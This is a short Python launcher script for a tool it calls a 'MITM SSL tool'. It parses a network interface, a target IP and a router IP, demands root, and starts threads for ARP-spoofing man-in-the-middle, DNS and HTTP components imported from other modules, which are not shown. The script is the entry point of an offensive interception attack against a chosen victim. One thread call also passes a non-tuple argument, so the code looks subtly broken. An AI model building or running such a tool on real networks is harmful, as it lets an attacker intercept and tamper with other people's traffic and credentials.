import argparse
import os
import sys
import threading
from stage import mitm, router, dns, http

parser = argparse.ArgumentParser(description='MITM SSL tool')
parser.add_argument('--iface', help='Interface to use', required=True)
parser.add_argument('--target', help='Target IP', required=True)
parser.add_argument('--router', help='Router IP (used for MITM ARP spoofing)',
                    required=True)
opts = parser.parse_args()

if os.getuid() != 0:
    print("run as root")
    sys.exit()

def main():
    router.run()
    t_http = threading.Thread(target=http.run, args=(opts.iface))
    t_mitm = threading.Thread(target=mitm.run, args=(opts.router, opts.target, opts.iface))
    t_dns = threading.Thread(target=dns.run, args=(opts.router, opts.target, opts.iface))

    t_mitm.start()
    t_dns.start()
    t_http.start()

if __name__ == "__main__":
    main()
    